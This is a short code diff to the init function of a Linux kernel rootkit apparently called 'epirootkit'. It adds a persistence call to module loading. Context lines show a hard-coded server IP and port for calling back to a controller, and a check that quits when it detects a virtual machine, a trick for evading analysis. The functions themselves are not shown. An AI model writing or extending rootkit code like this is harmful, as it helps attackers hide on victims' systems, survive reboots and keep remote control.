@@ -1,7 +1,8 @@
 #include "epirootkit.h"
 #include "init.h"
-#include "vanish.h"
 #include "passwd.h"
+#include "persist.h"
+#include "vanish.h"
 
 char *ip = SERVER_IP;
 int port = SERVER_PORT;
@@ -27,6 +28,10 @@ static int __init epirootkit_init(void) {
     if (VANISH && is_running_in_virtual_env()) {
         ERR_MSG("epirootkit_init: nooope, you should not pass\n");
         return -FAILURE;
+    }
+
+    if (persist() != SUCCESS) {
+        ERR_MSG("epirootkit_init: persistence failed to install\n");
     }
 
     if (init_interceptor() != SUCCESS) {
